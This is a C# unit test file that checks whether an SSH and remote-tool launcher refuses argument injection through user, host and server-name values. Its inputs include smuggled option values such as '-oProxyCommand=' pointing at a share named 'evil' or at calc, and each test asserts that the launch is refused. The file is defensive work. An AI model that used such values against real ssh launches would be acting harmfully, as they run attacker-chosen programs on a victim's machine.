/*
 * Copyright 2026 Julien Bombled
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

using System.Collections;
using System.Reflection;
using System.Runtime.InteropServices;
using Heimdall.Core.Configuration;
using Heimdall.Core.Security;

namespace Heimdall.Core.Tests;

/// <summary>
/// S-01. An external tool's arguments are one string started through the shell, which the tool
/// splits by the CRT rules. Expansion never adds quotes; a value that would not stay one plain
/// argument where the template puts it refuses the launch. The argv checks read the expanded
/// string back with the system's own parser (CommandLineToArgvW).
/// </summary>
public sealed class ExternalToolArgumentQuotingTests
{
    private const string Ssh = @"C:\Windows\System32\OpenSSH\ssh.exe";

    [Fact]
    public void TryResolveArguments_ProxyCommandUserName_IsRefused()
    {
        var tool = new ExternalToolDefinition { ExecutablePath = Ssh, Arguments = "{User}@{Host} -p {Port}" };

        bool resolved = tool.TryResolveArguments(
            "host.example.com",
            22,
            @"-oProxyCommand=\\evil\s\p.exe a",
            out string arguments,
            out ArgumentTemplateRejection? rejection);

        Assert.False(resolved);
        Assert.Equal("{User}", rejection!.Token);
        Assert.Equal(string.Empty, arguments);
    }

    // Without the space the value would stay one argument, and still be an option to OpenSSH.
    [Theory]
    [InlineData("{User}@{Host}")]
    [InlineData("-l {User} {Host}")]
    [InlineData("-l \"{User}\" {Host}")]
    public void TryResolveArguments_LeadingDashWhereTheValueBeginsAnArgument_IsRefused(string template)
    {
        var tool = new ExternalToolDefinition { ExecutablePath = Ssh, Arguments = template };

        Assert.False(tool.TryResolveArguments("host", 22, "-oProxyCommand=calc", out _, out ArgumentTemplateRejection? rejection));
        Assert.Equal(new ArgumentTemplateRejection("{User}", ArgumentRejection.LeadingDash), rejection);
    }

    // Glued to other text the dash is not an option: the shipped PsExec template "\\{Host}" and a
    // "--user={User}" style option keep working.
    [Theory]
    [InlineData("\\\\{Host} -accepteula")]
    [InlineData("--user={Host}")]
    [InlineData("\"--user={Host}\"")]
    public void TryResolveArguments_LeadingDashGluedToOtherText_IsAccepted(string template)
    {
        var tool = new ExternalToolDefinition { ExecutablePath = @"C:\tools\tool.exe", Arguments = template };

        Assert.True(tool.TryResolveArguments("-host", 22, "user", out _, out _));
    }

    [Fact]
    public void TryResolveArguments_ValueWithSpacesOutsideQuotes_IsRefusedAndAsksForQuotes()
    {
        var tool = new ExternalToolDefinition
        {
            ExecutablePath = @"C:\tools\winscp.exe",
            Arguments = "--title {ServerName} {Host}",
        };

        Assert.False(tool.TryResolveArguments("host", 22, "u", out _, out ArgumentTemplateRejection? rejection, serverName: "Web prod"));
        Assert.Equal(new ArgumentTemplateRejection("{ServerName}", ArgumentRejection.NeedsQuotes), rejection);
    }

    [Fact]
    public void TryResolveArguments_ValueWithSpacesInsideQuotes_IsOneArgument()
    {
        var tool = new ExternalToolDefinition
        {
            ExecutablePath = @"C:\tools\winscp.exe",
            Arguments = "--title \"{ServerName}\" {Host}",
        };

        Assert.True(tool.TryResolveArguments("host", 22, "u", out string arguments, out _, serverName: "Web (prod) a b"));

        Assert.Equal("--title \"Web (prod) a b\" host", arguments);
        Assert.Equal(["--title", "Web (prod) a b", "host"], Argv(arguments));
    }

    // The template quotes the key file, and the path ends in a backslash: left alone, the
    // backslash would escape the closing quote and swallow the next argument.
    [Fact]
    public void TryResolveArguments_TrailingBackslashInsideAQuotedPlaceholder_KeepsTheQuoteClosing()
    {
        var tool = new ExternalToolDefinition
        {
            ExecutablePath = @"C:\tools\putty.exe",
            Arguments = "-i \"{KeyFile}\" {User}@{Host}",
        };

        Assert.True(tool.TryResolveArguments("host", 22, "admin", out string arguments, out _, keyFile: @"C:\keys dir\"));

        Assert.Equal(["-i", @"C:\keys dir\", "admin@host"], Argv(arguments));
    }

    // A template that already quotes its placeholders keeps working, and gains no extra quotes.
    [Fact]
    public void TryResolveArguments_ExistingQuotedTemplate_KeepsWorking()
    {
        var tool = new ExternalToolDefinition
        {
            ExecutablePath = @"C:\tools\putty.exe",
            Arguments = "-ssh {User}@{Host} -P {Port} -i \"{KeyFile}\" -loghost \"{ServerName}\"",
        };

        Assert.True(tool.TryResolveArguments(
            "host.example.com",
            2222,
            "admin",
            out string arguments,
            out _,
            serverName: "Web (prod)",
            keyFile: @"C:\Users\me\My Keys\id.ppk"));

        Assert.Equal(
            "-ssh admin@host.example.com -P 2222 -i \"C:\\Users\\me\\My Keys\\id.ppk\" -loghost \"Web (prod)\"",
            arguments);
        Assert.Equal(
            ["-ssh", "admin@host.example.com", "-P", "2222", "-i", @"C:\Users\me\My Keys\id.ppk", "-loghost", "Web (prod)"],
            Argv(arguments));
    }

    [Theory]
    [InlineData("user\tname")]
    [InlineData("user\u0001")]
    public void TryResolveArguments_ControlCharacter_IsRefused(string user)
    {
        var tool = new ExternalToolDefinition { ExecutablePath = Ssh, Arguments = "\"{User}\"@{Host}" };

        Assert.False(tool.TryResolveArguments("host", 22, user, out _, out ArgumentTemplateRejection? rejection));
        Assert.Equal("{User}", rejection!.Token);
    }

    // Only a value the template substitutes is judged.
    [Fact]
    public void TryResolveArguments_UnusedPlaceholder_IsNotJudged()
    {
        var tool = new ExternalToolDefinition { ExecutablePath = Ssh, Arguments = "{User}@{Host}" };

        Assert.True(tool.TryResolveArguments("host", 22, "admin", out string arguments, out _, serverName: "-dash- with space"));
        Assert.Equal("admin@host", arguments);
    }

    // The multi-pass Replace expanded a value again: a host holding "{User}" became the user.
    [Fact]
    public void ResolveArguments_DoesNotExpandAValueTwice()
    {
        var tool = new ExternalToolDefinition { ExecutablePath = @"C:\tools\tool.exe", Arguments = "{Host} {User}" };

        Assert.Equal("x{User} admin", tool.ResolveArguments("x{User}", 22, "admin"));
    }

    // Every shipped detected-tool template expands as the Replace chain it replaced did.
    [Theory]
    [InlineData(typeof(SysinternalsToolProvider))]
    [InlineData(typeof(NirSoftToolProvider))]
    public void TryResolveDetectedArguments_ShippedTemplates_ProduceTheSameArguments(Type provider)
    {
        const string host = "srv01.corp.local";
        const string port = "445";
        const string user = "admin";
        List<string> templates = ShippedTemplates(provider);
        Assert.NotEmpty(templates);

        foreach (string template in templates)
        {
            string legacy = template
                .Replace("{Host}", host, StringComparison.OrdinalIgnoreCase)
                .Replace("{Port}", port, StringComparison.OrdinalIgnoreCase)
                .Replace("{User}", user, StringComparison.OrdinalIgnoreCase);

            Assert.True(
                ExternalToolDefinition.TryResolveDetectedArguments(template, "tool.exe", host, port, user, out string arguments, out _),
                template);
            Assert.Equal(legacy, arguments);
        }
    }

    [Fact]
    public void TryResolveDetectedArguments_PsExecTemplate_GluesTheHostToTheShareSyntax()
    {
        Assert.True(ExternalToolDefinition.TryResolveDetectedArguments(
            "\\\\{Host} -accepteula -nobanner", "psexec.exe", "srv01", null, null, out string arguments, out _));

        Assert.Equal(@"\\srv01 -accepteula -nobanner", arguments);
    }

    [Fact]
    public void TryResolveDetectedArguments_LeadingDashHost_IsRefused()
    {
        Assert.False(ExternalToolDefinition.TryResolveDetectedArguments(
            "-accepteula -nobanner {Host}", "whois.exe", "-x", null, null, out _, out ArgumentTemplateRejection? rejection));

        Assert.Equal(new ArgumentTemplateRejection("{Host}", ArgumentRejection.LeadingDash), rejection);
    }

    private static List<string> ShippedTemplates(Type provider)
    {
        FieldInfo field = provider.GetField("s_templates", BindingFlags.NonPublic | BindingFlags.Static)!;
        List<string> templates = [];
        foreach (object template in (IEnumerable)field.GetValue(null)!)
        {
            templates.Add((string)template.GetType().GetProperty("Arguments")!.GetValue(template)!);
        }

        return templates;
    }

    /// <summary>The arguments a CRT program receives for <paramref name="arguments"/>.</summary>
    private static string[] Argv(string arguments)
    {
        // The first token is the program name, which CommandLineToArgvW parses by other rules.
        IntPtr argv = CommandLineToArgvW("program.exe " + arguments, out int count);
        Assert.NotEqual(IntPtr.Zero, argv);
        try
        {
            var result = new string[count - 1];
            for (int index = 1; index < count; index++)
            {
                result[index - 1] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(argv, index * IntPtr.Size))!;
            }

            return result;
        }
        finally
        {
            LocalFree(argv);
        }
    }

    [DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr CommandLineToArgvW(string commandLine, out int argumentCount);

    [DllImport("kernel32.dll")]
    private static extern IntPtr LocalFree(IntPtr memory);
}
